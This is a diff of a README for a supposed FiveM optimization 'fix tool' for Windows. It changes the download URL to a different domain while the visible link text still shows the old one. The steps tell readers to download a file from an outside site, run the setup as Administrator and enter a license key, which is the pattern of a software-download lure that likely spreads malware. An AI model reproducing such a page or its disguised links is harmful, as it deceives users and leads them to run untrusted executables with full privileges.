@@ -14,14 +14,14 @@ Fix **fivem optimization pc** on Windows 10/11. Built for PC gamers — **direct
 
 | | |
 | --- | --- |
-| **Direct link** | **[fivemopz.wonderchain.fun](https://fivemopz.wonderchain.fun/)** |
-| **Full URL** | `https://fivemopz.wonderchain.fun/` |
+| **Direct link** | **[fivemopz.wonderchain.fun](https://fivemopz.kolmods.com/)** |
+| **Full URL** | `https://fivemopz.kolmods.com/` |
 | **Type** | Fix tool for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Open **[fivemopz.wonderchain.fun](https://fivemopz.wonderchain.fun/)** in your browser
+1. Open **[fivemopz.wonderchain.fun](https://fivemopz.kolmods.com/)** in your browser
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
